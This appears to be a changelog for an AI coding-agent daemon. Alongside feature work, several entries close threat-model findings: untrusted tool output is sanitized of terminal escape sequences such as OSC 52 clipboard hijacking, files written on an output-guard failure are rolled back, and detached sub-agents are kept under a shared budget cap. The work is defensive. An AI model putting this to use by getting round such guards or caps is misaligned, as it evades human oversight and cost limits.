- **P29.5** — `provider.prompt_profile`, `security.wsl_distro`, `security.dast.allowed_targets`,
  `security.dast.allow_active`, and `security.redact_secrets` were implemented and functional
  (some documented only in `docs/providers.md`) but missing from `docs/configuration.md`'s main
  reference. Added all five with their real defaults and behavior.
- **P29.6** — `docs/configuration.md`'s sample config showed `tui.humor_mode: false` (built-in
  default is `true`, `internal/config/config.go:857`) and `sandbox.backend: os` unqualified (built-in
  default is `local`, `internal/config/config.go:844` — `os` is only what `aegis --first-init`'s
  generated template writes). Corrected the humor_mode sample value and added an inline note next to
  `backend: os` explaining it reflects the first-init template, not the built-in default.

Tested: `go build ./...`, `go test ./internal/config/... ./internal/providerfactory/...` pass clean;
the rest of the batch is documentation-only with no runtime surface to exercise.

**P28.5** (Tier 3, Effort M/L) shipped: a resumable-run design so a web UI SSE stream that drops
mid-turn (network blip, backgrounded-tab throttling, daemon restart) reattaches and catches up
instead of surfacing a dead-end "Error: ..." — the gap flagged by the same 2026-07-14 live
evaluation, where local-model turns routinely ran 30s-150s+, making a mid-turn drop meaningfully
more likely than with fast cloud round-trips.

Investigated first (per the roadmap item's own note): the existing detached-run infrastructure —
`runRegistry` (`internal/server/runs.go`), the `bg_events` SQLite buffer
(`Store.AppendBGEvent`/`ListBGEvents`), and the web UI's `watchLive` reattach poller
(`app.tsx`) — already solves this completely for sessions explicitly marked `background` (P3.2): a
background session's run runs on a `context.Background()`-rooted context so a client disconnect
can't cancel it, and every event is buffered to SQLite so `watchLive` can catch up via
`GET /sessions/{id}/events?since=N`. The gap was that a normal (non-background) session's run uses
`r.Context()` as its base context, so a dropped connection cancels it via the engine's existing
`ctx.Done()` check (`engine.ErrInterrupted`) — there was nothing left running to reconnect *to*.
Generalizing background's survive-disconnect + event-buffering behavior to every run would have
also broken Stop: today, aborting the fetch is the *only* way either the TUI or the web UI stops a
run, by tearing down the same request context the engine runs on — both clients share this pattern
(`internal/tui/tui.go`'s `m.cancel`, the web UI's `controllerRef`). So resumability had to be opt-in
per request, not a blanket change to every run's lifetime.

Fix: `api.PostMessageRequest` gained `Resumable bool` (`internal/api/api.go`) — off by default, so
the TUI/CLI/mcp-serve keep today's exact disconnect-cancels-the-run behavior; only the web UI's
`send()` (`app.tsx`) sets it. In `handlePostMessage` (`internal/server/messages.go`), a `detached :=
sess.Background || resumable` local now gates both the context root (`context.Background()` instead
of `r.Context()`) and the event-buffering `send` wrapper that used to be `sess.Background`-only —
the two mechanisms were already identical in shape, this just extends who gets them. Because a
detached run's context is no longer tied to its request, disconnecting can no longer stop it either
— so `runRegistry` (`internal/server/runs.go`) gained a `cancel context.CancelFunc` per run
(`setCancel`) and a `stopSession` lookup, and a new endpoint, `POST /sessions/{id}/stop`
(`handleStopRun`), cancels the active resumable run for a session. The web UI's Stop button now
calls both `controller.abort()` (stop listening) and this endpoint (stop the run) — a plain
TUI/CLI run is unaffected, since it has no registered cancel and keeps stopping via disconnect. As a
side effect, an explicitly-`background` session — previously unstoppable once its owning client had
disconnected — can now also be stopped this way.

Client side (`internal/server/webui/frontend/src`): `api.ts`'s `consumeSSE` is unchanged; `app.tsx`'s
`send()` now sends `resumable: true` and distinguishes three stream-exit cases — a clean resolve
(the daemon closed the response itself, meaning the run is genuinely over, success or not: no
action), an `AbortError` (the user's own Stop click: show "Stopped." as before), and any other
exception (the connection was actually severed while the run may still be executing server-side: show
"Connection lost — reconnecting…" and hand off to the existing `watchLive(sessionId)` reattach
poller instead of building a second implementation of the same catch-up logic).

Tested: `internal/server/runs_test.go` — `TestRunRegistryStopSession` (cancel registration/lookup in
isolation), `TestResumableRunSurvivesClientDisconnect` (end-to-end over the real HTTP+SSE seam via
`httptest.NewServer` + `internal/client`: a `blockingAdapter` mid-stream run keeps executing and
buffering events after the client request is cancelled, confirmed via `GET /runs` staying non-empty
and `GetBGEvents` containing the terminal `done` event once released), and
`TestStopRunCancelsResumableRun` (`POST /sessions/{id}/stop` actually interrupts the run, and 404s
on a session with nothing resumable to stop). `internal/client/client.go` gained `StopRun` to drive
the new endpoint from tests (and any future non-web-UI caller). Frontend: `tsc --noEmit` and
`npm run build` both pass clean; `dist/` regenerated and committed. `go build ./...`, `go vet ./...`,
and the full `go test ./...` (plus `-race` on the touched packages) pass clean.

**P28.3** (Tier 3, Effort M) shipped: the engine now detects a suspicious zero-tool-call completion
on a plainly actionable task and nudges the model to reconsider and act, instead of silently
accepting a text-only turn as done — the `deepseek-r1:8b` failure mode from the same 2026-07-14
live evaluation that filed the whole P28 batch, where the model's reasoning got dumped as the final
answer instead of being followed by a structured tool call.

Investigated first (per the roadmap item's own note): Ollama's OpenAI-compatible endpoint
(`docs.ollama.com/api/openai-compatibility`) explicitly does not support `tool_choice`, ruling out
sending `tool_choice: "required"` from the OpenAI adapter for this repo's primary local-model
target. That left the corrective-nudge/retry path — the same shape as the existing output-guard
retry (P25.3) — as the one to build.

Fix, `internal/engine/engine.go`: in the `len(toolUses) == 0` branch of `Engine.Run`, after the
existing max-tokens-continuation check and before the output-guard check, a new condition fires the
nudge: no tool round has completed yet this run (`toolRoundsCompleted == 0` — a text-only wrap-up
*after* real tool use is a legitimate final answer, not a suspicious non-action), tools are actually
registered (`len(e.tools.Schemas()) > 0`), a retry budget remains (new `Options.ZeroToolNudgeMaxRetries`,
0 → default 1, negative disables), and the triggering request `looksActionable` — a new purely local
heuristic (same "regex/word-count, never an extra model call" philosophy as `routing.go`'s
`classifyTurn`) that strips a leading politeness wrapper ("could you please...") and checks for a
leading imperative verb from a fixed vocabulary (fix, implement, add, write, run, refactor, ...)
against the most recent user message (`lastUserText`). Deliberately biased toward missing a real task
(the safe, today's-behavior default) over firing on a genuine question — a wrong nudge wastes one
turn but corrupts nothing. On a match, the engine appends a corrective prompt (`zeroToolNudgeText`)
telling the model to call the appropriate tool now rather than just describing the action, and loops.
Once the run settles (whether the nudge succeeded or the single retry was also text-only and gets
surfaced anyway), `retractZeroToolNudges` strips the nudge prompt and the text-only answer it was
reacting to from the durable transcript — mirroring `retractGuardCorrectives` exactly, including the
same marker-prefix-based matching so a mid-run compaction or prepare-step rewrite can't desync
index-based bookkeeping.

Wired end to end: `ProviderConfig` gained `zero_tool_nudge` (`internal/config/config.go`, 0 = default
1 retry, negative disables, mirroring `loop_threshold`'s convention), and `s.newEngine`
(`internal/server/engine_build.go`) passes it through as `ZeroToolNudgeMaxRetries`.

Tested: new `internal/engine/nudge_test.go` — `TestLooksActionable` (table-driven heuristic cases,
including polite phrasing and plain questions that must *not* match), `TestZeroToolNudgeRetriesOnActionableTextOnlyTurn`
(full nudge-then-tool-call-then-final-answer round trip via a `scriptedAdapter`, asserting the nudge
text reached the retry request and was retracted from the final transcript),
`TestZeroToolNudgeSkippedOnNonActionablePrompt`, `TestZeroToolNudgeSkippedWithoutTools`,
`TestZeroToolNudgeSkippedAfterToolRound` (three no-nudge-fires regressions),
`TestZeroToolNudgeExhaustedSurfacesTextAnswer` (retry budget exhausted still surfaces an answer
rather than looping), and `TestZeroToolNudgeDisabledByNegativeOption`. `go build ./...`, `go vet
./...`, and the full `go test ./...` pass clean. `docs/providers.md`'s tool-calling-reliability
section, which previously noted this as "not yet built," now points at the shipped behavior instead.

**P28.7** (Tier 2, Effort S) shipped: a persistent connection/model-health indicator in the TUI
status area and the web UI header.

Real usage evidence, not a hypothetical: this daemon's own `GET /sessions` history contained at
least 6 near-duplicate sessions from 2026-06-26/27 titled things like "test that the model is
connected," "validate model is connected," "confirm that the model is connected," and "Check that
the model is connected" — a recorded pattern of users spending a full conversational turn just to
sanity-check daemon-to-model connectivity. `aegis doctor` and `GET /status`
(`internal/server/server.go`'s `handleStatusInfo`) already answered this server-side, but neither
client surfaced it passively — a user had to know to run one of them.

Fix, server side: `GET /status`'s response (`api.StatusInfo`, `internal/api/api.go`) gained two
fields, `provider_reachable` and `provider_latency_ms`, populated by a new
`Server.probeProviderReachability` (`internal/server/provider_health.go`). This mirrors `aegis
doctor`'s existing provider check (`doctorProviderCheck`/`ollamaNativeBase` in
`internal/cli/doctor.go`) rather than inventing new semantics: for an Ollama-style provider
(`provider.default: ollama`, or a `base_url` containing the default Ollama port — the same
detection doctor.go uses) it's a live `GET /api/version` with a 2-second timeout, timed for
latency (reusing `internal/ollamainfo.IsOllama`, already used by the context-window
auto-detection path); for a cloud provider, a live call on every `/status` poll would be wasteful
or, for a paid API, costly, so reachability there is just "an API key is present in the resolved
config" — the same signal doctor uses — with latency left unmeasured (0). `handleStatusInfo` calls
this and adds the two fields to its response; no new endpoint was added.

Fix, TUI side (`internal/tui/tui.go`): the daemon `/status` payload was already fetched at startup
and after each run (for the effective-context-window fallback, P23.1) but never polled
continuously. Added a new `statusTickMsg`/`statusTickCmd` pair that reschedules a `/status`
re-fetch every 20 seconds (`statusRefreshInterval`), independent of run activity, so the indicator
stays current without user action. New model fields `connKnown`/`connReachable`/`connLatencyMS`
are set from each `statusInfoMsg` (a request error — the daemon itself unreachable — is
distinguished from the daemon reporting its configured provider unreachable, both rendering as
"down"). Rendered in two places: a compact colored-dot glyph (`renderConnBadge`, green/red/muted
for reachable/unreachable/unknown, plus a `NNms` suffix once latency is measured) in the
always-visible title bar next to the model name, and a fuller `reachable · NNms` /
`unreachable` / `checking…` line (`renderConnDetail`) under the sidebar's existing MODEL section.

Fix, web UI side (`internal/server/webui/frontend/src`): `types.ts`'s `StatusInfo` interface
gained the two new fields. `app.tsx`'s existing `loadStatus()` poll (previously only called at
mount and after specific actions) now also runs on a 20-second `setInterval`, mirroring the TUI's
cadence. A new chip in the topbar — not gated on `currentId`, since `/status` is daemon-wide, not
per-session — shows a colored dot, the configured model name, and the latency when measured, with
a tooltip carrying the full detail (provider/model, reachable/unreachable, latency). New
`.chip.conn-ok`/`.chip.conn-down` CSS rules in `style.css` reuse the green/red palette already
established for scanner availability (`.avail.ok`/`.avail.bad`) and other status chips elsewhere
in the same file, rather than inventing new colors.

Tested: `go build ./...`, `go vet ./...`, and the full `go test ./...` pass clean, including new
`TestProbeProviderReachability_Ollama` (fake Ollama server via `httptest`, live `/api/version`
round trip), `TestProbeProviderReachability_OllamaUnreachable`, `TestProbeProviderReachability_Cloud`
(API-key-present/absent), and `TestProbeProviderReachability_BaseURLPortDetection`
(`internal/server/provider_health_test.go`), plus an extended `TestServerStatusEndpoint`
(`internal/server/server_test.go`) asserting `ProviderReachable`/`ProviderLatencyMS` for a
no-API-key cloud provider; and new `TestStatusInfoMsgUpdatesConnectionState`,
`TestStatusTickMsgReschedules`, `TestRenderConnBadgeAndDetail`
(`internal/tui/status_health_test.go`) covering the TUI's state transitions and rendering.
Frontend: `npm --prefix internal/server/webui/frontend run build` (`tsc -b && vite build`) passed
clean — TypeScript type-checked the new `StatusInfo` fields and topbar chip — and the regenerated
`internal/server/webui/dist/` output is committed alongside the source change per this repo's
embedded-webui convention. This was the last of Tier 2's four items — see [roadmap.md](roadmap.md).

Same day (2026-07-14): **P28.4** (Tier 2, compaction robustness) shipped: proactive
per-turn context compaction now falls back to a deterministic, non-LLM shortening pass after the
LLM summarizer fails twice in a row for the same run, instead of skipping compaction indefinitely.

Live evaluation (`TestLiveWorkflow` against `qwythos:latest`, `deepseek-r1:8b`, `gpt-oss:20b`,
2026-07-14, the same pass that filed the whole P28 batch) observed `proactive compaction failed:
summarizer returned empty output` (`internal/compaction/compaction.go:212`) against both
`qwythos:latest` and `gpt-oss:20b`. Before this fix, `internal/engine/engine.go`'s proactive
per-turn compaction check (P2.7, ~85% context fill) just logged a `Warn` and skipped compaction for
that turn entirely on any `Compactor.Compact` error — no retry, no fallback. Long local-model
sessions run far more turns/tokens per task than cloud sessions (observed: 87k input / 2.4k output
tokens over 13 tool calls for one bug fix with `gpt-oss:20b`), so a summarizer that unreliably
returns empty output could repeatedly fail to shrink context every single turn, drifting toward the
hard context-window ceiling with no safety valve — the model server would then start silently
dropping the oldest tokens (including the system prompt) rather than Aegis ever compacting on its
own terms.

Investigated the existing compaction data model first (`internal/compaction/compaction.go`): a
"turn" boundary for compaction is chosen by `Summarizer.boundary`, which finds the first assistant
message at or after the `keepRecent` cutoff so the summarized prefix never splits a
`tool_use`/`tool_result` pair; the LLM summary then replaces that whole prefix with a single
synthetic `user` message ("Summary of earlier conversation...") spliced in ahead of the preserved
suffix. There was no existing per-session or per-run failure-count tracking to piggyback on — the
`compaction.Summarizer` is a single daemon-wide singleton (`s.compactor`, built once in
`internal/server/server.go`) shared across every session, and `engine.Engine` itself is
reconstructed fresh per HTTP request/turn (`s.newEngine` in `internal/server/messages.go`) — so
neither was a natural home for cross-request state. Since `engine.Run`'s own tool-round loop
(`for iter := 0; iter < e.maxIterations; iter++`, default cap 40) already spans every tool round of
a single long local-model task — the exact shape of the observed failure (13 tool calls in one bug
fix, all inside one `Run` call) — a run-scoped counter was sufficient to catch "twice in a row"
without needing to thread new state through the session store: a new `compactionFailures` local
counter in `Engine.Run`, reset to 0 on any successful compaction (LLM-summarized or
deterministic-fallback) and incremented on each `Compact` error, mirroring the existing
`guardRetries`/`ctxFullWarned` per-run locals already in that function.

Fix, in two parts. (1) `internal/compaction/compaction.go` gets a new
`(*Summarizer).FallbackCompact(msgs []provider.Message) (out []provider.Message, changed bool)` —
deterministic, makes no adapter call, and so cannot itself return empty output. It reuses the exact
same `boundary` selection as `Compact`/`ForceCompact` (protecting the `keepRecent` tail and tool-use
pairing) but replaces the summarized prefix with a terse, programmatically generated note (message
counts, tool-call count, and the distinct tool names used) instead of an AI-generated summary — a
structurally valid replacement for the LLM summary, not just an arbitrary non-empty string. (2)
`internal/engine/engine.go` gets a new optional `FallbackCompactor` interface
(`FallbackCompact(msgs) (out, changed)`) that the proactive-compaction block in `Engine.Run`
type-asserts for on `e.compactor` — so a `Compactor` that only implements `Compact` (e.g. a test
double or a future non-LLM implementation) keeps today's warn-and-skip behavior unchanged. On the
2nd consecutive `Compact` failure within a run, the engine calls `FallbackCompact` if the configured
compactor supports it; on success it splices the deterministic result in exactly like a normal
compaction, emits the existing `KindNotice` (now naming the fallback explicitly, e.g. "context ~87%
full — summarizer unavailable, applied deterministic fallback compaction (42→6 messages)"), and
resets the failure counter. `compaction.New`'s production `*Summarizer` now satisfies
`FallbackCompactor` automatically, so the daemon's real compactor gets the fallback with no wiring
changes in `internal/server`.

New tests: `TestFallbackCompactShrinksWithoutLLM`, `TestFallbackCompactPreservesToolPair`,
`TestFallbackCompactTooShortIsNoop` (`internal/compaction/compaction_test.go`, mirroring the
existing `Compact`/`ForceCompact` coverage for the new deterministic path) and
`TestProactiveCompactionFallsBackAfterTwoFailures` (`internal/engine/contextnotice_test.go`, a new
`failingFallbackCompactor` test double that always fails `Compact` but implements
`FallbackCompact` — asserts the fallback fires on exactly the 2nd consecutive failure, not the 1st,
and that the resulting notice mentions the fallback). `go build ./...`, `go vet ./...`, and the full
`go test ./...` pass clean. This was one of Tier 2's four items (P28.2, P28.4, P28.6, P28.7); two
remain — see [roadmap.md](roadmap.md).

Same day (2026-07-14): **P28.2** (Tier 2, cheap no-dependency win) shipped: guidance on which
locally-runnable model families reliably drive Aegis's tool-calling loop, plus a new `aegis doctor`
check that catches the failure mode live. Live evaluation (`TestLiveWorkflow` against
`qwythos:latest`, `deepseek-r1:8b`, `gpt-oss:20b`, 2026-07-14) found wide variance in local-model
tool-calling reliability: `qwythos:latest` (this repo's own configured `provider.model` default)
correctly diagnosed a seeded bug in its response text but never called `edit_file`/`write_file` to
actually fix it; `deepseek-r1:8b` made **zero tool calls** on an explicit run/fix/verify task,
answering entirely in prose instead (a known R1-distill failure mode — reasoning dumped as the final
answer instead of a structured `tool_call`); only `gpt-oss:20b` completed the task end-to-end (13
tool calls, 2m28s). `aegis doctor`'s existing provider check (`doctorProviderCheck`) only verifies
reachability and model availability, never tool-calling competence, so this class of failure was
invisible until a real task hit it.

Fix, part (a): a new "Tool-calling reliability for local models" section in `docs/providers.md`
(right after the Ollama setup section, alongside the existing "better tool use" model-pull hints)
documents the three live-eval outcomes above and recommends instruction-tuned/tool-calling-marketed
models (`gpt-oss:20b`-class, `qwen2.5:32b`+) over small reasoning-distilled models for agentic tasks,
cross-references the doctor check below, and notes the `qwythos:latest` diagnose-but-don't-act pattern
responds well to a more directive follow-up prompt while the underlying engine has no automatic
nudge/retry yet (that's **P28.3**, deliberately out of scope here — investigation-gated, not built
speculatively).

Fix, part (b): a new `doctorToolCallCheck` (`internal/cli/doctor.go`), wired into `runDoctorChecks`
right after `doctorProviderCheck`, sends a single cheap live request — one trivial `list_files` tool
schema plus an unambiguous "call the tool now, don't describe it" prompt (`MaxTokens: 256`, 20s
timeout) — through the same `providerfactory.Build` adapter construction the daemon uses, and counts
`provider.EventToolUse` events in the response stream. Scoped to local (Ollama-style) providers only,
via the same `ollamaNativeBase` gate `doctorProviderCheck` already uses: this is where the observed
variance lives, cloud providers have well-established tool-calling support, and skipping them keeps
the check free of live network cost for the common cloud-provider case — it silently returns PASS
("skipped") for a cloud provider, an unresolved (`auto`/empty) model, or an adapter-construction
failure `doctorProviderCheck` already reports. Any failure past that point — transport error, stream
error, or a genuine zero-tool-call response — degrades to WARN, **never FAIL**: this check must not be
able to make `aegis doctor` exit non-zero on its own, matching how `doctorDaemonChecks` already
degrades to WARN (not FAIL) when no daemon is reachable, and keeping it safe for offline/CI use. A
zero-tool-call WARN's `Fix` field points at the new `docs/providers.md` section by name.

Tested: new `TestDoctorToolCallCheckSkipsCloudProvider`, `TestDoctorToolCallCheckSkipsUnresolvedModel`,
`TestDoctorToolCallCheckDetectsZeroToolCalls`, `TestDoctorToolCallCheckPassesOnToolCall`,
`TestDoctorToolCallCheckWarnsOnTransportFailure` (`internal/cli/doctor_test.go`) — the latter three
drive a real `httptest.Server` emitting hand-written OpenAI-compatible SSE chunks (no live model
needed) to exercise the zero-tool-call, one-tool-call, and unreachable-server paths deterministically,
reproducing the `deepseek-r1:8b`/`gpt-oss:20b` outcomes observed live without a network dependency in
CI. Existing `TestDoctorCleanSetupExitsZero` and `TestDoctorNamesPodmanMisconfig` (which configure a
cloud provider) continue to pass unchanged, confirming the cloud-skip path adds no new network
dependency to the existing suite. `go build ./...`, `go vet ./...`, and `go test ./...` pass clean.
This was the second of Tier 2's four remaining items; **P28.6**, **P28.7** remain open.

Same day (2026-07-14): **P28.6** (Tier 2, harness-quality fix, not a product bug) shipped:
`TestLiveWorkflow/LocalPromptProfileReducesFirstTurnTokens` (`internal/eval/live_workflow_test.go`)
compared first-turn input token counts between the daemon's `local` and `default` prompt profiles,
expecting `local` to come out lower. Investigation traced the "local" prompt profile's only actual
effect anywhere in the code: `effectiveSystem` (`internal/server/helpers.go:62`) omits the injected
repo map entirely when `LocalPromptProfile()` is true *and* the rendered map exceeds
`localRepoMapMaxBytes` (4000 bytes, `helpers.go:35`) — nothing else differs between the two
profiles. The subtest's shared fixture (`writeSeededBugFixture`, a 2-file temp directory with no
`.aegis/repomap.json` cache) never gets a repo map injected at all regardless of profile — the
daemon's own `loadRepoMap` (`internal/server/server.go:583`) returns `""` when no cache file exists
— so `local` and `default` produced byte-identical system prompts for this fixture. The observed
pass/fail was therefore just noise in the live model's own reported token usage, not a signal about
the feature: passed for `gpt-oss:20b` (5638<5942 tokens), failed for `deepseek-r1:8b`
(3183>2567) on the same code, with nothing else changed between runs.

Fix, per the roadmap item's option (a) — a fixture large enough to actually trigger the cap, kept
inside the live daemon+HTTP+SSE integration path rather than moved to a plain unit test (a
non-live-tagged unit test doing exactly that already exists,
`TestEffectiveSystem_localProfileTrimsPrompt` in `internal/server/server_test.go`, so duplicating it
inside the live-tagged file would add nothing; the point of this specific subtest is verifying the
profile's effect survives the real daemon-to-live-model round trip, which only this tier can check).
New `writeBigRepoMapFixture` (`internal/eval/live_workflow_test.go`) writes 15 filler `.py` files
(10 functions each) into a dedicated workspace, then pre-builds and saves a `repomap.json` cache
directly via `repomap.Build`/`Map.Save` — what `aegis index` or the daemon's own startup
`loadRepoMap` would produce — so the daemon picks up a real, cached repo map on process start. The
fixture self-checks its own rendered-block size against a local `bigRepoMapCapBytes` constant
(4000, mirroring the unexported `localRepoMapMaxBytes`) and fails loudly if a future repo-map
format change ever shrinks it back under the cap, rather than silently reintroducing the original
bug. Verified standalone (outside the gated test, since it needs no live model): the generated
fixture renders a 5934-byte `<repo_map>` block — comfortably above the 4000-byte cap and below
repomap's own 8000-byte internal truncation budget, so the two profiles end up "full map" vs. "no
map" rather than "full map" vs. "truncated map" — a large, deterministic difference that should
dominate any live-model token-accounting noise. The `LocalPromptProfileReducesFirstTurnTokens`
subtest now chdir's into this dedicated workspace for its own duration only (restored after,
matching the file's existing single-process-chdir convention) rather than reusing the shared
`FixSeededBug`/`GuardNoMetaLeak` fixture, so this change doesn't affect those other subtests.
`internal/server/helpers.go`'s actual repo-map-cap behavior was deliberately left untouched — this
is a harness fix only.

Tested: `go build ./...`, `go vet ./...`, and the full `go test ./...` pass clean, plus
`go build -tags live_workflow ./...` and `go vet -tags live_workflow ./...` to confirm the
tagged file still compiles. The fixture's byte-size math was independently verified by running its
exact generation logic in a throwaway, non-tagged test inside `internal/repomap` (deleted after
confirming the 5934-byte result above) — not by executing `TestLiveWorkflow` itself, since that
needs a reachable Ollama server this environment doesn't have. The live-tagged
`LocalPromptProfileReducesFirstTurnTokens` subtest was therefore reasoned about and compiled, not
run end-to-end; the reasoning rests on: (1) `effectiveSystem`'s cap-check logic
(`internal/server/helpers.go:62`) is unchanged and already covered by
`TestEffectiveSystem_localProfileTrimsPrompt`, which passes non-live and confirms the omit/include
split at this exact threshold; (2) the new fixture's cache is built with the same `repomap.Build`/
`Map.Save`/`Load` path production code uses, not a hand-rolled stand-in; (3) the chdir scoping was
checked by hand against the subtest ordering (this is the last of the three subtests in
`TestLiveWorkflow`, so scoping the extra chdir to it doesn't disturb `FixSeededBug`/
`GuardNoMetaLeak`, which run first and already completed against the original fixture). This was
the third of Tier 2's four remaining items; **P28.7** remains open.

Before that, same day (2026-07-14): **P28.1** (Tier 1, real exploitable robustness gap) shipped: the TUI
now strips dangerous terminal escape sequences from untrusted tool output before it reaches the
real terminal. This closed the P27 threat model's last open needs-verification question — whether
the TUI fully neutralizes terminal escape sequences in untrusted tool output — which this same pass
confirmed it did not. `stripControlSeqs` (P24.20/FIND-17) only ever ran on the model's own generated
prose inside `mdRender`; raw tool output (`shell` stdout/stderr, `read_file` contents,
`grep`/`web_fetch`/`web_search` results) rendered via `renderBlock`/`renderLinesBlock`
(`internal/tui/toolview.go`) only ever passed through `remapANSI16` (`internal/tui/ansi16.go`), which
rewrites SGR colour codes and leaves every other escape sequence untouched — OSC 8 hyperlink-text
spoofing, OSC 52 clipboard hijack, cursor-hide, alternate-screen-buffer switches, OSC 0/2 title-bar
spoofing all reached the terminal unfiltered from a malicious/compromised file read or
shell/web_fetch/web_search result.

Fix: a new `stripDangerousSeqs` (`internal/tui/sanitize.go`) — a sibling to `stripControlSeqs` that
keeps CSI SGR sequences (`ESC [ ... m`, needed for `remapANSI16` to have something to rewrite) but
strips everything else recognized: OSC/DCS/APC/PM/SOS strings, other 7-bit C1 forms, and any non-SGR
CSI (cursor movement/hiding, alternate-screen-buffer switches). Wired in at three points so no
raw-tool-output path is missed: `renderToolResult` (`internal/tui/toolview.go`) — the single funnel
every rendered tool result (single-line, multi-line generic block, and `read_file`) passes through —
sanitizes `result` once up front; `renderBlock` sanitizes independently too, since it's also called
from `renderShellCall`'s fallback path outside `renderToolResult`; and `renderShellCall` itself
sanitizes the model-supplied command before handing it to chroma for syntax highlighting, since a
successful highlight match bypasses `renderBlock` entirely via `renderLinesBlock`. New tests:
`TestStripDangerousSeqs`, `TestStripDangerousSeqsIdempotent` (`internal/tui/sanitize_test.go`),
`TestRenderToolResult_SanitizesDangerousSeqs`, `TestRenderShellCall_SanitizesDangerousSeqs`
(`internal/tui/toolview_test.go`) — covering OSC 52 clipboard hijack, OSC 8 hyperlink-target
spoofing, cursor manipulation, and alternate-screen switches across the single-line, multi-line, and
`read_file` render branches, plus confirming SGR colour still survives sanitization plus
`remapANSI16`'s truecolor rewrite. `go build ./...`, `go vet ./...`, and the full `go test ./...`
pass clean. This was the roadmap's sole Tier 1 item.

Before that, same day (2026-07-13): **P27.19** (FIND-17, Tier 4, CVSS 5.9) shipped: documentation-only
close-out of the P27 threat model's container-socket-trust finding. FIND-17 flagged that
Docker/Podman socket access is root-equivalent on the host and asked for docs recommending
"rootless Podman or a socket-proxy." The rootless-Podman half, along with the
`--cap-drop=ALL`/`--security-opt=no-new-privileges` hardening and the `--network none` default
FIND-17 also cites, was already shipped and already documented under **P24.10 (FIND-06)** — an
earlier threat-model pass that found and fixed the same underlying issue — in the "Docker/Podman
socket privilege equivalence" section of `docs/security_scan.md`. The one genuine gap between
FIND-17's remediation text and the pre-existing docs was the socket-proxy option, which wasn't
mentioned anywhere. Added a bullet to that section recommending a socket-proxy (e.g.
`docker-socket-proxy`) restricted to the container-create/start/stop endpoints Aegis needs, as an
alternative to rootless Podman for deployments stuck on a rootful Docker daemon. No code changes —
Aegis doesn't ship or manage a socket-proxy itself, this is operator guidance only. Confirms the
verification the finding itself asked for ("confirm the documented guidance recommends
rootless/socket-proxy configurations and that default container flags include `--cap-drop=ALL` and
`no-new-privileges`") is now fully true. Closes Tier 4's P27.19; **P27.20** (optional at-rest
SQLite encryption) remains parked with no concrete trigger.

Before that, same day (2026-07-13): **P27.16** (FIND-15, Tier 3, CVSS 3.6) shipped: quarantine-on-FAIL
for the output guard, closing the gap where a guard verdict of FAIL that exhausted the corrective
retry budget only ever led to the failing response being surfaced anyway — any file a `write_file`/
`edit_file` call made that turn already landed on disk and stayed there exactly as the failing model
left it. Aegis already had a full checkpoint/rewind mechanism (`internal/checkpoint`) built for the
user-facing `/rewind` feature: `write_file`/`edit_file` call `checkpoint.SnapshotterFrom(ctx).
Capture(absPath)` before every write, lazily recording each touched path's pre-turn content into the
turn's checkpoint the first time it's touched, and `Store.RestoreFiles(ctx, checkpointID)` restores
every captured path back to that pre-turn state (deleting files that did not exist before the turn).
Rather than build a second, parallel mechanism, `internal/engine/engine.go`'s exhausted-retries FAIL
branch (previously just `emit(Event{Kind: KindGuard, GuardPassed: false, ...})` and nothing else)
now also calls the checkpoint machinery: a new `(*checkpoint.Snapshotter).RestoreFiles(ctx)` method
(`internal/checkpoint/checkpoint.go`) delegates to the existing `Store.RestoreFiles` for that
snapshotter's own checkpoint ID, so the engine doesn't need a new field or a direct `*Store`
reference — it already receives the run's `Snapshotter` via `checkpoint.SnapshotterFrom(ctx)`, the
same context value `internal/server/messages.go` already wires in via `checkpoint.WithSnapshotter`
before every turn. `RestoreFiles` is nil-safe (mirrors `Capture`'s existing nil-safety), so a caller
with no checkpoint store configured (`s.checkpoints == nil`, or an embedded engine used outside the
daemon) is a no-op — rollback is skipped and today's retry-then-surface behavior is unchanged rather
than erroring. The rollback is surfaced to callers two ways: a new `Engine.Event.GuardFilesRestored`
int on the terminal `KindGuard` failure event, and the restored-file count appended in prose to that
same event's `GuardReason` (e.g. "... — rolled back 2 file(s) written this turn"), which the TUI's
existing `⚠ output guard: ...` warning line already renders verbatim with no new UI wiring. A plain
`e.logger.Warn` line also records the rollback (or a restore failure) for daemon-log visibility. Of
the finding's two suggested remediations — (a) quarantine/roll back on FAIL, or (b) a lighter
pre-write guard pass before irreversible writes — (a) was chosen as the more surgical fit that reuses
existing machinery end-to-end rather than adding a second validation pass; scope stayed tight,
matching the finding's Tier 3 "Effort: M" sizing. New tests: `TestGuardExhaustedRollsBackWrittenFile`
and `TestGuardExhaustedNoCheckpointStoreSkipsRollback` (`internal/engine/guard_test.go`, driving the
engine against the real `write_file` tool and a real temp-file-backed checkpoint store) plus
`TestSnapshotterRestoreFiles` and `TestNilSnapshotterRestoreFiles` (`internal/checkpoint/
checkpoint_test.go`). `go build ./...`, `go vet ./...`, and the full `go test ./...` pass clean.

---

Before that, same day (2026-07-13): **P27.17** (FIND-16, Tier 3, CVSS 3.4) shipped: propagate a
shared/proportional budget ceiling into detached swarm sub-agent spawns, so they can't escape the
fan-out tree's cost cap.

The finding's own evidence pointed at `internal/swarm/agent.go`, but investigation before writing
any code found the actual production spawn path was `internal/tool/builtin/agent.go`'s
`spawnBackground` — the only place a detached/background sub-agent spawn (`agent` tool with
`background: true`) is created — and that it *already* carried the shared cost tracker forward
correctly: `task.Manager.Start` runs its job under a context derived from `context.Background()`
(severed from the request that created it), so `spawnBackground` reads `swarm.CostTrackerFromContext`
off the caller's ctx *before* calling `Start`, then explicitly re-attaches it (`swarm.WithCostTracker`)
onto the job's own context before handing off to the swarm backend — a fix that traces back to commit
`c368b4b`, well predating this threat-model pass, with an explanatory comment already in place at
`agent.go:476-484`. `internal/swarm/subprocess.go`'s `SubprocessBackend.Spawn` — the backend a
detached spawn actually reaches when running in subprocess mode — already used that carried-forward
tracker to compute a fair-share-reduced `WorkerSpec.RemainingBudgetUSD`/`RemainingTokens` (P10.3's
`remainingBudget`/`remainingTokens`, with P24.15's fair-share floor), and `internal/cli/worker.go`'s
`runWorker` already uses those spec fields as the spawned engine's actual budget/token caps in place
of the daemon's full configured ones. Each half already had its own unit coverage
(`TestAgentToolBackgroundSpawnCarriesCostTracker` against a stub backend; several
`TestSubprocessSpawn*RemainingBudget*`/`*FairShareFloor*` tests calling `Spawn` directly with a
context that already carried a tracker) — but nothing had ever exercised both halves together,
through the real production entry point, with a real (non-stub) subprocess backend actually
receiving the reduced ceiling. New `TestAgentToolBackgroundSpawnRespectsSharedBudgetCeiling`
(`internal/tool/builtin/agent_subprocess_test.go`) closes exactly that gap: it drives the real
`agentTool.Execute` with `background: true` through a real `task.Manager` and a real
